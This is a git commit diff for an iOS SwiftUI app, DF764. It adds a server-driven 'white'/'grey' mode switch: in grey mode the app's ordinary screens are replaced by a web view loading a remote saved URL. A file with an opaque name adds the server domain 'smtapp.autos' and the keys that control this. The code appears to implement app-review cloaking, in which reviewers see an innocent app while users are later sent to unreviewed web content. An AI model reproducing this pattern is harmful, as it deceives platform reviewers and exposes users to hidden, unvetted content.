8dbe005993a0b2b35615e17fff9c5cb8fb163d95
IGOLIVIT <131347905+IGOLIVIT@users.noreply.github.com>
2025-12-08 19:20:27 +0300

    new1

--- DF764/ContentView.swift
+++ DF764/ContentView.swift
@@ -3,24 +3,78 @@
 //  DF764
 //
 
+
 import SwiftUI
+import UserNotifications
 
 struct ContentView: View {
+    
     @StateObject private var appState = AppState()
+
+//    @StateObject private var notificationService = NotificationService.shared
+    @AppStorage("onboarding_completed") private var onboardingCompleted = false
+    
+    @StateObject private var appState2 = AppState2()
+    @StateObject private var network = NetworkMonitor.shared
     
     var body: some View {
-        Group {
-            if appState.hasCompletedOnboarding {
-                HomeView()
-                    .environmentObject(appState)
-                    .transition(.opacity)
-            } else {
-                OnboardingView()
-                    .environmentObject(appState)
-                    .transition(.opacity)
+        ZStack {
+            
+            Group {
+                switch appState2.mode {
+                case .none:
+                    ProgressView()
+                case .some(.white):
+                    ZStack {
+                        
+                        Group {
+                            if appState.hasCompletedOnboarding {
+                                HomeView()
+                                    .environmentObject(appState)
+                                    .transition(.opacity)
+                            } else {
+                                OnboardingView()
+                                    .environmentObject(appState)
+                                    .transition(.opacity)
+                            }
+                        }
+                        .animation(.easeInOut(duration: 0.4), value: appState.hasCompletedOnboarding)
+                    }
+                case .some(.grey):
+                    
+                    if let url = appState2.savedGreyURL {
+                        WebContainerView(initialURL: url) // из WebView слоя
+                    } else {
+                        ZStack {
+                            
+                            Group {
+                                if appState.hasCompletedOnboarding {
+                                    HomeView()
+                                        .environmentObject(appState)
+                                        .transition(.opacity)
+                                } else {
+                                    OnboardingView()
+                                        .environmentObject(appState)
+                                        .transition(.opacity)
+                                }
+                            }
+                            .animation(.easeInOut(duration: 0.4), value: appState.hasCompletedOnboarding)
+                        }
+                    }
+                }
+            }
+            .alert("No connection to internet",
+                   isPresented: $appState2.showNoInternetAlertForGrey) {
+                Button("Open settings") { appState2.openSettings() }
+                Button("Cancel", role: .cancel) { }
+            } message: {
+                Text("To continue: turn on celullar data and come back to app")
             }
         }
-        .animation(.easeInOut(duration: 0.4), value: appState.hasCompletedOnboarding)
+        .onAppear {
+            
+            appState2.bootstrap()
+        }
     }
 }
 
---
+++ DF764/Core/Dbr23.swift
@@ -0,0 +1,17 @@
+//
+//  Dbr23.swift
+//  DF764
+//
+//  Created by IGOR on 08/12/2025.
+//
+
+struct DataManager {
+
+    let SERVER_URL = "smtapp.autos" // -- заменить
+    
+    
+    // не трогать это
+    let JSON_KEY = "url"
+    let APP_MODE_KEY = "app_mode"
+    let SAVED_URL_KEY = "saved_url"
+}
